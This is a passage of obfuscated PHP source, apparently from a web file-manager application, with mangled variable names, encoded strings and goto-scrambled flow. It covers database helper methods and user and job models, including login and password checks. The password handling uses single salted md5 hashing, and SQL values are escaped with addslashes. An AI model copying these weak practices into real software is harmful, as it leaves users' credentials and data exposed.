$fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[54]] : !1), $DΩÊïÆõﬁç[39] => isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[919]]) ? strtolower($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[919]]) == $DΩÊïÆõﬁç[41] : (isset($fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[93]]) ? $fﬂéÀê»‘Ÿ[$DΩÊïÆõﬁç[93]] : !1)); } } goto døô‰Ú≠Â‡; FÓ”çâÀó≈: } public function getTables($eÿÑ±É“Œ¨ = '') { $EƒêäÕíÆ˘ =& $_SERVER[Öíæ€“”≠éÏË]; if (think_config($EƒêäÕíÆ˘[920])) { $Bâª·«õ‚¡ = str_replace($EƒêäÕíÆ˘[921], $eÿÑ±É“Œ¨, think_config($EƒêäÕíÆ˘[920])); } else { switch ($this->dbType) { case $EƒêäÕíÆ˘[888]: case $EƒêäÕíÆ˘[890]: $Bâª·«õ‚¡ = $EƒêäÕíÆ˘[922]; break; case $EƒêäÕíÆ˘[887]: case $EƒêäÕíÆ˘[905]: $Bâª·«õ‚¡ = $EƒêäÕíÆ˘[923]; break; case $EƒêäÕíÆ˘[914]: $Bâª·«õ‚¡ = $EƒêäÕíÆ˘[924]; break; case $EƒêäÕíÆ˘[889]: think_exception(think_lang($EƒêäÕíÆ˘[925]) . $EƒêäÕíÆ˘[926]); break; case $EƒêäÕíÆ˘[906]: $Bâª·«õ‚¡ = $EƒêäÕíÆ˘[42] . $EƒêäÕíÆ˘[43] . $EƒêäÕíÆ˘[44]; break; case $EƒêäÕíÆ˘[917]: default: if (!empty($eÿÑ±É“Œ¨)) { $Bâª·«õ‚¡ = $EƒêäÕíÆ˘[870] . $eÿÑ±É“Œ¨ . $EƒêäÕíÆ˘[871]; } else { $Bâª·«õ‚¡ = $EƒêäÕíÆ˘[872]; } } } $Aë÷ª≈…Ãì = $this->query($Bâª·«õ‚¡); $e¶Ó¨ë·”õ = array(); foreach ($Aë÷ª≈…Ãì as $a˜ø´âäÉê => $aÊä®Ô÷™à) { $e¶Ó¨ë·”õ[$a˜ø´âäÉê] = current($aÊä®Ô÷™à); } return $e¶Ó¨ë·”õ; } protected function parseLimit($Aê∂Úî›†ü) { $eñ™⁄ÎÒ‹ª =& $_SERVER[Öíæ€“”≠éÏË]; $fƒÆ¥¡ÊÈä = $eñ™⁄ÎÒ‹ª[33]; if (!empty($Aê∂Úî›†ü)) { switch ($this->dbType) { case $eñ™⁄ÎÒ‹ª[914]: case $eñ™⁄ÎÒ‹ª[906]: $Aê∂Úî›†ü = explode($eñ™⁄ÎÒ‹ª[47], $Aê∂Úî›†ü); if (count($Aê∂Úî›†ü) > 1) { $fƒÆ¥¡ÊÈä .= $eñ™⁄ÎÒ‹ª[48] . $Aê∂Úî›†ü[1] . $eñ™⁄ÎÒ‹ª[49] . $Aê∂Úî›†ü[0] . $eñ™⁄ÎÒ‹ª[50]; } else { $fƒÆ¥¡ÊÈä .= $eñ™⁄ÎÒ‹ª[48] . $Aê∂Úî›†ü[0] . $eñ™⁄ÎÒ‹ª[50]; } break; case $eñ™⁄ÎÒ‹ª[887]: case $eñ™⁄ÎÒ‹ª[905]: break; case $eñ™⁄ÎÒ‹ª[889]: break; case $eñ™⁄ÎÒ‹ª[888]: case $eñ™⁄ÎÒ‹ª[890]: break; case $eñ™⁄ÎÒ‹ª[917]: default: $fƒÆ¥¡ÊÈä .= $eñ™⁄ÎÒ‹ª[48] . $Aê∂Úî›†ü . $eñ™⁄ÎÒ‹ª[50]; } } return $fƒÆ¥¡ÊÈä; } public function parseKey(&$F¶±ûÿ¨Ò‚, $døÜ“à€é¯ = true) { $Eò±Í–∏œí =& $_SERVER[Öíæ€“”≠éÏË]; if ($døÜ“à€é¯) { $F¶±ûÿ¨Ò‚ = $this->parseKeyCheck($F¶±ûÿ¨Ò‚); } if ($this->dbType == $Eò±Í–∏œí[917]) { if ($F¶±ûÿ¨Ò‚ != $Eò±Í–∏œí[182] && !preg_match($Eò±Í–∏œí[882], $F¶±ûÿ¨Ò‚)) { $F¶±ûÿ¨Ò‚ = $Eò±Í–∏œí[382] . trim($F¶±ûÿ¨Ò‚, $Eò±Í–∏œí[382]) . $Eò±Í–∏œí[382]; } return $F¶±ûÿ¨Ò‚; } else { return parent::parseKey($F¶±ûÿ¨Ò‚, $døÜ“à€é¯); } } public function close() { $this->_linkID = null; } public function error() { $aêñå©‹≈Ω =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->PDOStatement) { $Bõèß√Ìæº = $this->PDOStatement->errorInfo(); $this->error = $Bõèß√Ìæº[1] . $aêñå©‹≈Ω[4] . $Bõèß√Ìæº[2]; } else { $this->error = $aêñå©‹≈Ω[33]; } if ($aêñå©‹≈Ω[33] != $this->queryStr) { $this->error .= LNG($aêñå©‹≈Ω[45]) . $this->queryStr; } think_trace($this->error, $aêñå©‹≈Ω[33], $aêñå©‹≈Ω[46]); return $this->error; } public function escapeString($Dœ‡‚≤éùó) { $AµŸ˜…≤‹Ã =& $_SERVER[Öíæ€“”≠éÏË]; switch ($this->dbType) { case $AµŸ˜…≤‹Ã[914]: case $AµŸ˜…≤‹Ã[887]: case $AµŸ˜…≤‹Ã[905]: case $AµŸ˜…≤‹Ã[917]: return addslashes($Dœ‡‚≤éùó); case $AµŸ˜…≤‹Ã[889]: case $AµŸ˜…≤‹Ã[906]: case $AµŸ˜…≤‹Ã[888]: case $AµŸ˜…≤‹Ã[890]: return str_ireplace($AµŸ˜…≤‹Ã[55], $AµŸ˜…≤‹Ã[56], $Dœ‡‚≤éùó); } } protected function parseValue($F¬Ú≈ãΩí≠) { $cÑµçÁú˘õ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_string($F¬Ú≈ãΩí≠)) { $dÀã‡ôÌÂ£ = strpos($F¬Ú≈ãΩí≠, $cÑµçÁú˘õ[4]) === 0 && in_array($F¬Ú≈ãΩí≠, array_keys($this->bind)); $F¬Ú≈ãΩí≠ = $dÀã‡ôÌÂ£ ? $this->escapeString($F¬Ú≈ãΩí≠) : $cÑµçÁú˘õ[927] . $this->escapeString($F¬Ú≈ãΩí≠) . $cÑµçÁú˘õ[927]; } elseif (isset($F¬Ú≈ãΩí≠[0]) && is_string($F¬Ú≈ãΩí≠[0]) && strtolower($F¬Ú≈ãΩí≠[0]) == $cÑµçÁú˘õ[295]) { $F¬Ú≈ãΩí≠ = $this->escapeString($F¬Ú≈ãΩí≠[1]); } elseif (is_array($F¬Ú≈ãΩí≠)) { $F¬Ú≈ãΩí≠ = array_map(array($this, $cÑµçÁú˘õ[928]), $F¬Ú≈ãΩí≠); } elseif (is_bool($F¬Ú≈ãΩí≠)) { $F¬Ú≈ãΩí≠ = $F¬Ú≈ãΩí≠ ? $cÑµçÁú˘õ[87] : $cÑµçÁú˘õ[191]; } elseif (is_null($F¬Ú≈ãΩí≠)) { $F¬Ú≈ãΩí≠ = $cÑµçÁú˘õ[103]; } return $F¬Ú≈ãΩí≠; } public function getLastInsertId() { $aâ†Ö∂–ÇÛ =& $_SERVER[Öíæ€“”≠éÏË]; switch ($this->dbType) { case $aâ†Ö∂–ÇÛ[914]: case $aâ†Ö∂–ÇÛ[906]: case $aâ†Ö∂–ÇÛ[887]: case $aâ†Ö∂–ÇÛ[905]: case $aâ†Ö∂–ÇÛ[889]: case $aâ†Ö∂–ÇÛ[917]: return $this->_linkID->lastInsertId(); case $aâ†Ö∂–ÇÛ[888]: case $aâ†Ö∂–ÇÛ[890]: $aìåéŒ≠Òã = $this->table; $DŒ°»∞∂“ = $this->query("\123\105\114\105\x43\x54\40{$aìåéŒ≠Òã}\x2e\143\x75\162\162\x76\141\154\x20\x63\165\x72\x72\x76\x61\154\40\x46\122\117\x4d\x20\x64\x75\141\x6c"); return $DŒ°»∞∂“ ? $DŒ°»∞∂“[0][$aâ†Ö∂–ÇÛ[929]] : 0; } } } goto Bäïéµ¬Ãö; fÈˆÃáÚ£∂: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\152\157\x62\x4c\151\163\164"; public $field = array("\156\x61\155\145", "\x64\x65\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\x73\145\154\146\x4a\x6f\x62\114\151\163\x74"; public function listData($FìÜÙÒ¿˘Û = false, $f¯É”·äÖ¡ = "\163\x6f\x72\164", $Bê‹ú°êÃÙ = false) { return parent::listData($FìÜÙÒ¿˘Û, $f¯É”·äÖ¡, $Bê‹ú°êÃÙ); } public function remove($b‰Ñ«∞ËòÖ) { return parent::remove($b‰Ñ«∞ËòÖ); } public function add($a¯Í¡æÂ£) { $d€éµ–ôƒ‡ =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->findByName($a¯Í¡æÂ£[$d€éµ–ôƒ‡[28]])) { return !1; } $a¯Í¡æÂ£[$d€éµ–ôƒ‡[1730]] = $this->getSort(); return parent::insert($a¯Í¡æÂ£); } private function getSort() { $a‡•È Ûﬂ† =& $_SERVER[Öíæ€“”≠éÏË]; $aÛôœª¯ÌÙ = parent::listData(); $BÜè∏ŸÌﬁ√ = array_to_keyvalue($aÛôœª¯ÌÙ, $a‡•È Ûﬂ†[33], $a‡•È Ûﬂ†[1730]); return empty($BÜè∏ŸÌﬁ√) ? 0 : max($BÜè∏ŸÌﬁ√) + 1; } public function update($Bõ¡ëîˆ∑õ, $cµ√ëÿâã£) { $B©‡Ë‹öÃÕ =& $_SERVER[Öíæ€“”≠éÏË]; $d⁄É£ç‹±… = parent::listData($Bõ¡ëîˆ∑õ); $aÉá∑í‚äÃ = $this->findByName($cµ√ëÿâã£[$B©‡Ë‹öÃÕ[28]]); if (!$d⁄É£ç‹±… || $aÉá∑í‚äÃ && $aÉá∑í‚äÃ[$B©‡Ë‹öÃÕ[394]] != $d⁄É£ç‹±…[$B©‡Ë‹öÃÕ[394]]) { return !1; } return parent::update($Bõ¡ëîˆ∑õ, $cµ√ëÿâã£); } public function setUserJob($fﬂ“ˆÆ•íÍ, $c˜êÍêæ˘) { goto AŸƒçË§¨ñ; AŸƒçË§¨ñ: $aÊæúòœçÇ =& $_SERVER[Öíæ€“”≠éÏË]; if (!is_array($c˜êÍêæ˘)) { $c˜êÍêæ˘ = array($c˜êÍêæ˘); } $BØæÁ¯ªõˆ = parent::listData(); goto aé–∫ˆ™ÑÑ; Fœ¬í§·ÑŸ: $B—’üâ Ëó = rtrim($B—’üâ Ëó, $aÊæúòœçÇ[47]); Model($aÊæúòœçÇ[520])->metaSet($fﬂ“ˆÆ•íÍ, self::JOB_KEY, $B—’üâ Ëó); goto CéÈ≤É™¿; aé–∫ˆ™ÑÑ: $cÂ⁄◊¬‘Ìá = array_to_keyvalue($BØæÁ¯ªõˆ, $aÊæúòœçÇ[28]); $B—’üâ Ëó = $aÊæúòœçÇ[375]; foreach ($c˜êÍêæ˘ as $C“‡âãè¶º) { if ($cÂ⁄◊¬‘Ìá[$C“‡âãè¶º]) { $B—’üâ Ëó .= $cÂ⁄◊¬‘Ìá[$C“‡âãè¶º][$aÊæúòœçÇ[394]] . $aÊæúòœçÇ[47]; } else { $aæãúı°«ú = $this->add($C“‡âãè¶º); $B—’üâ Ëó .= $aæãúı°«ú . $aÊæúòœçÇ[47]; } } goto Fœ¬í§·ÑŸ; CéÈ≤É™¿: } public function getUserJob($CΩÜ∑ÜÊÌ…) { $B÷¶¿Çﬂ∂‚ = Model($_SERVER[Öíæ€“”≠éÏË][520])->metaGet($CΩÜ∑ÜÊÌ…); return $this->getUserJobInfo($B÷¶¿Çﬂ∂‚[self::JOB_KEY]); } public function getUserJobInfo($eÍäåüıì…) { goto AÏÁïûÛ÷…; Fî‡ÃÃäÇá: return $d› Öù€öî; goto C“•Áó¿óå; AÏÁïûÛ÷…: $dÛ∞»Îû©≤ =& $_SERVER[Öíæ€“”≠éÏË]; $a”‡‰∏£ÖÊ = explode($dÛ∞»Îû©≤[47], $eÍäåüıì…); $A…Ê∫µ∞¨à = parent::listData(); goto aÍ‡¯çéÃç; aÍ‡¯çéÃç: $A…Ê∫µ∞¨à = array_remove_key($A…Ê∫µ∞¨à, $dÛ∞»Îû©≤[194]); $d› Öù€öî = array(); foreach ($a”‡‰∏£ÖÊ as $Cﬂ·‘¡¨Î≤) { if (isset($A…Ê∫µ∞¨à[$Cﬂ·‘¡¨Î≤])) { $d› Öù€öî[] = $A…Ê∫µ∞¨à[$Cﬂ·‘¡¨Î≤]; } } goto Fî‡ÃÃäÇá; C“•Áó¿óå: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\155\145" => "\165\163\145\162\137\155\x65\x74\141", "\x6d\x65\x74\x61\x46\151\145\x6c\x64" => "\x75\x73\145\162\111\x44"); protected $simpleField = "\x75\x73\x65\x72\x49\x44\x2c\156\151\x63\x6b\x4e\141\155\x65\x2c\156\141\x6d\145\54\141\x76\x61\x74\141\x72\x2c\163\x65\x78\x2c\x73\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($fÈÂÿìﬂ»Ó) { $F¢õäœ∆ÁÑ =& $_SERVER[Öíæ€“”≠éÏË]; $C»Û∏ù…êå = $F¢õäœ∆ÁÑ[2136]; return array($F¢õäœ∆ÁÑ[1781] => array($fÈÂÿìﬂ»Ó[0], $C»Û∏ù…êå), $F¢õäœ∆ÁÑ[1783] => array($fÈÂÿìﬂ»Ó[0], $C»Û∏ù…êå), $F¢õäœ∆ÁÑ[2137] => array($fÈÂÿìﬂ»Ó[0], $C»Û∏ù…êå)); } protected function getInfo($e¶ùƒÕ∆öﬁ, $CŸöéé¬îÇ = false) { $Eá˜∂á±Ùà = $this->getInfoSimple($e¶ùƒÕ∆öﬁ); if (!is_array($Eá˜∂á±Ùà)) { return array(); } if ($CŸöéé¬îÇ) { return $this->_getInfoApply($Eá˜∂á±Ùà); } return $this->cacheFunctionGet($_SERVER[Öíæ€“”≠éÏË][1785], $e¶ùƒÕ∆öﬁ); } protected function getInfoFull($dë¿“‡´ ⁄, $EâüàŒæëﬁ = false) { $cˆñØÀ∂ ù = $this->getInfoSimple($dë¿“‡´ ⁄); if (!is_array($cˆñØÀ∂ ù)) { return array(); } if ($EâüàŒæëﬁ) { return $this->_getInfoApply($cˆñØÀ∂ ù, !0); } return $this->cacheFunctionGet($_SERVER[Öíæ€“”≠éÏË][2138], $dë¿“‡´ ⁄); } private function _getInfoApply($eˆÆí·ı¢å, $d⁄ˆøõôè± = false) { goto Båèﬁ ªñù; Fò¥Êﬂ≥∏Œ: $eˆÆí·ı¢å[$bÙ«ñ˜¶í›[85]][$bÙ«ñ˜¶í›[1971]] = isset($F†ÔﬁÁÑö—[$bÙ«ñ˜¶í›[1972]]) ? $F†ÔﬁÁÑö—[$bÙ«ñ˜¶í›[1972]] : null; if ($d⁄ˆøõôè±) { $eˆÆí·ı¢å[$bÙ«ñ˜¶í›[446]] = $this->metaGet($eˆÆí·ı¢å[$bÙ«ñ˜¶í›[1538]]); } return $eˆÆí·ı¢å; goto f»åû◊¿Ñö; a•ŸƒµÉ–î: $eˆÆí·ı¢å = $this->_listDataApplyItem($eˆÆí·ı¢å); $F†ÔﬁÁÑö— = Model($bÙ«ñ˜¶í›[1215])->metaGet($eˆÆí·ı¢å[$bÙ«ñ˜¶í›[85]][$bÙ«ñ˜¶í›[396]]); $eˆÆí·ı¢å[$bÙ«ñ˜¶í›[2141]] = $dá°¨ïìŒ∫; goto Fò¥Êﬂ≥∏Œ; Båèﬁ ªñù: $bÙ«ñ˜¶í› =& $_SERVER[Öíæ€“”≠éÏË]; if (!$eˆÆí·ı¢å) { return $eˆÆí·ı¢å; } $dá°¨ïìŒ∫ = md5($bÙ«ñ˜¶í›[2139] . $eˆÆí·ı¢å[$bÙ«ñ˜¶í›[860]] . $bÙ«ñ˜¶í›[2140] . $eˆÆí·ı¢å[$bÙ«ñ˜¶í›[28]]); goto a•ŸƒµÉ–î; f»åû◊¿Ñö: } protected function getInfoSimple($d†∞›ÁÓ±, $eëŸ›ÖÍÂä = false) { $dóﬂ„åﬁê≠ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$d†∞›ÁÓ±) { return array(); } if ($eëŸ›ÖÍÂä) { $Aﬂ‡µ±î«¿ = $this->where(array($dóﬂ„åﬁê≠[1538] => intval($d†∞›ÁÓ±)))->find(); if (!is_array($Aﬂ‡µ±î«¿)) { return array(); } $Aﬂ‡µ±î«¿[$dóﬂ„åﬁê≠[2142]] = Action($dóﬂ„åﬁê≠[2143])->parseUrl($Aﬂ‡µ±î«¿[$dóﬂ„åﬁê≠[2142]]); return $Aﬂ‡µ±î«¿; } return $this->cacheFunctionGet($dóﬂ„åﬁê≠[1786], $d†∞›ÁÓ±); } protected function getInfoSimpleOuter($FÁèú∫‚Òª) { goto fãîù»ÖÑ∑; dúª¬ú∞Õà: return $E® ã¡ˆ–¶; goto dÈËÊ˜≈‹à; fãîù»ÖÑ∑: $fá¬ÇÉÔŸì =& $_SERVER[Öíæ€“”≠éÏË]; if (!$FÁèú∫‚Òª || $FÁèú∫‚Òª == 0) { return array($fá¬ÇÉÔŸì[1538] => $fá¬ÇÉÔŸì[191], $fá¬ÇÉÔŸì[28] => $fá¬ÇÉÔŸì[160] . LNG($fá¬ÇÉÔŸì[2144]) . $fá¬ÇÉÔŸì[518], $fá¬ÇÉÔŸì[2142] => STATIC_PATH . $fá¬ÇÉÔŸì[2145]); } $B ¡›˘∆ÊΩ = $this->cacheFunctionGet($fá¬ÇÉÔŸì[1786], $FÁèú∫‚Òª); goto fÔø‡‰é¶é; fÔø‡‰é¶é: $E® ã¡ˆ–¶ = array_field_key($B ¡›˘∆ÊΩ, explode($fá¬ÇÉÔŸì[47], $this->simpleField)); if (!$E® ã¡ˆ–¶) { return array($fá¬ÇÉÔŸì[1538] => $fá¬ÇÉÔŸì[1094], $fá¬ÇÉÔŸì[28] => $fá¬ÇÉÔŸì[160] . LNG($fá¬ÇÉÔŸì[2146]) . $fá¬ÇÉÔŸì[518], $fá¬ÇÉÔŸì[2142] => STATIC_PATH . $fá¬ÇÉÔŸì[2147]); } $E® ã¡ˆ–¶[$fá¬ÇÉÔŸì[2142]] = Action($fá¬ÇÉÔŸì[2143])->parseUrl($E® ã¡ˆ–¶[$fá¬ÇÉÔŸì[2142]]); goto dúª¬ú∞Õà; dÈËÊ˜≈‹à: } protected function groupUser($fßéè¶ÔÛë) { } public static function errorLang($C¬‹ùûÏÕß) { $aú≥Èπó◊â =& $_SERVER[Öíæ€“”≠éÏË]; $Eë÷ÛÖ®ﬁé = array(self::ERROR_USER_NOT_EXISTS => $aú≥Èπó◊â[2148], self::ERROR_USER_PASSWORD_ERROR => $aú≥Èπó◊â[2149], self::ERROR_USER_EXIST_NAME => $aú≥Èπó◊â[2150], self::ERROR_USER_EXIST_PHONE => $aú≥Èπó◊â[2151], self::ERROR_USER_EXIST_EMAIL => $aú≥Èπó◊â[2152], self::ERROR_USER_LOGIN_LOCK => $aú≥Èπó◊â[2153], self::ERROR_IP_NOT_ALLOW => $aú≥Èπó◊â[2154], self::ERROR_USER_EXIST_NICKNAME => $aú≥Èπó◊â[2155]); return LNG($Eë÷ÛÖ®ﬁé[$C¬‹ùûÏÕß]); } public function getInfoByMeta($bõíÖ»™ûﬂ, $EÌ†ÌÖÀπœ) { $eÕπ•ﬂ‘ÔÇ =& $_SERVER[Öíæ€“”≠éÏË]; $AÊ¿ÕÖ†œ∞ = Model($eÕπ•ﬂ‘ÔÇ[2156])->where(array($eÕπ•ﬂ‘ÔÇ[93] => $bõíÖ»™ûﬂ, $eÕπ•ﬂ‘ÔÇ[372] => $EÌ†ÌÖÀπœ))->find(); if ($AÊ¿ÕÖ†œ∞) { return $this->getInfo($AÊ¿ÕÖ†œ∞[$eÕπ•ﬂ‘ÔÇ[1538]]); } return !1; } public function userLoginCheck($b ÍÎ¢©„Ü, $dõ√∂’≈Îá) { $A»ôòÃ¯Õ∏ =& $_SERVER[Öíæ€“”≠éÏË]; $cáÀ˘∑Ô™Ø = $this->userLoginFind($b ÍÎ¢©„Ü); if (!$cáÀ˘∑Ô™Ø) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($cáÀ˘∑Ô™Ø[$A»ôòÃ¯Õ∏[1538]], $dõ√∂’≈Îá)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($cáÀ˘∑Ô™Ø[$A»ôòÃ¯Õ∏[1538]]); } public function userLoginFind($EˆÔîÿ œ◊) { $cÀªî˜¬¯… =& $_SERVER[Öíæ€“”≠éÏË]; $a•œﬂãı¶ª = array($cÀªî˜¬¯…[28] => $EˆÔîÿ œ◊, $cÀªî˜¬¯…[1975] => $EˆÔîÿ œ◊, $cÀªî˜¬¯…[303] => $EˆÔîÿ œ◊, $cÀªî˜¬¯…[2157] => $EˆÔîÿ œ◊, $cÀªî˜¬¯…[968] => $cÀªî˜¬¯…[970]); if ($this->nickNameRpt()) { unset($a•œﬂãı¶ª[$cÀªî˜¬¯…[1975]]); } return $this->where($a•œﬂãı¶ª)->find(); } public function clearCache($Bç∆¿ Ïﬂ°) { $eÃÉúƒÂ„Ö =& $_SERVER[Öíæ€“”≠éÏË]; $this->cacheFunctionClear($eÃÉúƒÂ„Ö[1785], $Bç∆¿ Ïﬂ°); $this->cacheFunctionClear($eÃÉúƒÂ„Ö[1786], $Bç∆¿ Ïﬂ°); $this->cacheFunctionClear($eÃÉúƒÂ„Ö[2138], $Bç∆¿ Ïﬂ°); } public function userPasswordCheck($e⁄∏ÏöØ¿∂, $Båãë◊âŸÛ) { $DÈˆ„≤◊˘î =& $_SERVER[Öíæ€“”≠éÏË]; $cØçˆ‚¶≥† = $this->where(array($DÈˆ„≤◊˘î[1538] => intval($e⁄∏ÏöØ¿∂)))->find(); $a∑ï¥Áã≤Õ = $this->metaGet($e⁄∏ÏöØ¿∂); $Eùí•§Öö∞ = isset($a∑ï¥Áã≤Õ[$DÈˆ„≤◊˘î[2158]]) ? $a∑ï¥Áã≤Õ[$DÈˆ„≤◊˘î[2158]] : $DÈˆ„≤◊˘î[33]; if (md5($Eùí•§Öö∞ . trim($Båãë◊âŸÛ)) !== $cØçˆ‚¶≥†[$DÈˆ„≤◊˘î[860]]) { return !1; } return !0; } public function userAdd($C–Çë©Àìı) { goto a•‚™Ô≈∂ä; Dëã£°∫„ä: return $cÕ‹ú¬…π‘; goto B⁄Ã∆ﬂ÷¨¯; a•‚™Ô≈∂ä: $b∫ãû⁄°è› =& $_SERVER[Öíæ€“”≠éÏË]; $b¬êÁÒûö¬ = array($b∫ãû⁄°è›[414] => $C–Çë©Àìı[$b∫ãû⁄°è›[28]], $b∫ãû⁄°è›[2159] => $C–Çë©Àìı[$b∫ãû⁄°è›[1421]], $b∫ãû⁄°è›[2160] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[303]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[303]] : $b∫ãû⁄°è›[33], $b∫ãû⁄°è›[2161] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[2157]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[2157]] : $b∫ãû⁄°è›[33], $b∫ãû⁄°è›[2162] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[1975]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[1975]] : $C–Çë©Àìı[$b∫ãû⁄°è›[28]], $b∫ãû⁄°è›[2163] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[2142]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[2142]] : $b∫ãû⁄°è›[33], $b∫ãû⁄°è›[2164] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[2165]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[2165]] : 1, $b∫ãû⁄°è›[2166] => $C–Çë©Àìı[$b∫ãû⁄°è›[860]], $b∫ãû⁄°è›[1787] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[1691]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[1691]] : 1024 * 1024 * 20, $b∫ãû⁄°è›[1788] => 0, $b∫ãû⁄°è›[2167] => 0, $b∫ãû⁄°è›[1830] => isset($C–Çë©Àìı[$b∫ãû⁄°è›[723]]) ? $C–Çë©Àìı[$b∫ãû⁄°è›[723]] : 1); if (!empty($C–Çë©Àìı[$b∫ãû⁄°è›[1538]])) { $b¬êÁÒûö¬[$b∫ãû⁄°è›[1538]] = $C–Çë©Àìı[$b∫ãû⁄°è›[1538]]; } goto EÊâˆòÿÉÔ; EÊâˆòÿÉÔ: $bÜ†í⁄œΩ¥ = $this->_checkExist($C–Çë©Àìı); if ($bÜ†í⁄œΩ¥ !== !0) { return $bÜ†í⁄œΩ¥; } $cÕ‹ú¬…π‘ = $this->add($b¬êÁÒûö¬); goto còãﬂ÷∂…∞; còãﬂ÷∂…∞: $e˘∑Õ¯⁄·Ê = array($b∫ãû⁄°è›[2166] => $b¬êÁÒûö¬[$b∫ãû⁄°è›[860]], $b∫ãû⁄°è›[2162] => $b¬êÁÒûö¬[$b∫ãû⁄°è›[1975]]); $this->userEdit($cÕ‹ú¬…π‘, $e˘∑Õ¯⁄·Ê); Model($b∫ãû⁄°è›[1215])->userRootAdd($cÕ‹ú¬…π‘); goto Dëã£°∫„ä; B⁄Ã∆ﬂ÷¨¯: } protected function userEditTest($e≥π‹òÖ°¥, $D‚Á®ˆèˆà) { return $this->call($_SERVER[Öíæ€“”≠éÏË][2168], $e≥π‹òÖ°¥, $D‚Á®ˆèˆà); } protected function userEdit($B›≈ßÉÙÎÏ, $C·Ø∏¡√¶©) { goto BŸ¯≠ùÿ≥„; eÁ÷ºÌ§¢è: $dúñ˜œÏÃ¯ = $this->_checkExist($C·Ø∏¡√¶©, $B›≈ßÉÙÎÏ); if ($dúñ˜œÏÃ¯ !== !0) { return $dúñ˜œÏÃ¯; } if (isset($C·Ø∏¡√¶©[$F¨çó⁄∞øœ[860]]) && trim($C·Ø∏¡√¶©[$F¨çó⁄∞øœ[860]]) != $F¨çó⁄∞øœ[33]) { $a÷¥À¡Ûà© = $this->metaGet($B›≈ßÉÙÎÏ); if (empty($a÷¥À¡Ûà©[$F¨çó⁄∞øœ[2158]])) { $a÷¥À¡Ûà©[$F¨çó⁄∞øœ[2158]] = rand_string(10); Model($F¨çó⁄∞øœ[495])->metaSet($B›≈ßÉÙÎÏ, $F¨çó⁄∞øœ[2158], $a÷¥À¡Ûà©[$F¨çó⁄∞øœ[2158]]); } $C·Ø∏¡√¶©[$F¨çó⁄∞øœ[860]] = md5($a÷¥À¡Ûà©[$F¨çó⁄∞øœ[2158]] . trim($C·Ø∏¡√¶©[$F¨çó⁄∞øœ[860]])); } else { unset($C·Ø∏¡√¶©[$F¨çó⁄∞øœ[860]]); } goto DëÊâÉ±âﬂ; f≤∏ˆÈÂÕ∏: return !0; goto CÁÉ⁄∏Ω∫“; DëÊâÉ±âﬂ: $this->where(array($F¨çó⁄∞øœ[1529] => $B›≈ßÉÙÎÏ))->save($C·Ø∏¡√¶©); if (isset($C·Ø∏¡√¶©[$F¨çó⁄∞øœ[1975]])) { $this->setNamePinyin($B›≈ßÉÙÎÏ, $C·Ø∏¡√¶©[$F¨çó⁄∞øœ[1975]]); } $this->clearCache($B›≈ßÉÙÎÏ); goto f≤∏ˆÈÂÕ∏; BŸ¯≠ùÿ≥„: $F¨çó⁄∞øœ =& $_SERVER[Öíæ€“”≠éÏË]; $CâçêáÜ≠∂ = $this->getInfoSimple($B›≈ßÉÙÎÏ); if (!$CâçêáÜ≠∂) { return !1; } goto eÁ÷ºÌ§¢è; CÁÉ⁄∏Ω∫“: } public function setNamePinyin($Fôπı“ËÜ°, $b’¯äÒíÕó = false) { $CäüØò ÷• =& $_SERVER[Öíæ€“”≠éÏË]; if (!$b’¯äÒíÕó) { $eÀ°Ï¡ÍÇ = $this->getInfoSimple($Fôπı“ËÜ°); $b’¯äÒíÕó = $eÀ°Ï¡ÍÇ[$CäüØò ÷•[1975]] ? $eÀ°Ï¡ÍÇ[$CäüØò ÷•[1975]] : $eÀ°Ï¡ÍÇ[$CäüØò ÷•[28]]; } $AæÊÊ◊ï†  = Model($CäüØò ÷•[520]); if (!Input::check($b’¯äÒíÕó, $CäüØò ÷•[570])) { return $AæÊÊ◊ï† ->metaSet($Fôπı“ËÜ°, array($CäüØò ÷•[445] => $CäüØò ÷•[33], $CäüØò ÷•[444] => $CäüØò ÷•[33])); } return $AæÊÊ◊ï† ->metaSet($Fôπı“ËÜ°, array($CäüØò ÷•[445] => str_replace($CäüØò ÷•[50], $CäüØò ÷•[33], Pinyin::encode($b’¯äÒíÕó)), $CäüØò ÷•[444] => Pinyin::encode($b’¯äÒíÕó, $CäüØò ÷•[571]))); } private function nickNameRpt() { $cúÖòéıÎ =& $_SERVER[Öíæ€“”≠éÏË]; $EÕô∑»„ ⁄ = Model($cúÖòéıÎ[743])->get($cúÖòéıÎ[2169]); $E¯£®¶˜¯º = $GLOBALS[$cúÖòéıÎ[6]][$cúÖòéıÎ[378]][$cúÖòéıÎ[2169]]; $bŒÏë™‹ É = !is_null($EÕô∑»„ ⁄) ? $EÕô∑»„ ⁄ : $E¯£®¶˜¯º; return !!$bŒÏë™‹ É; } private function 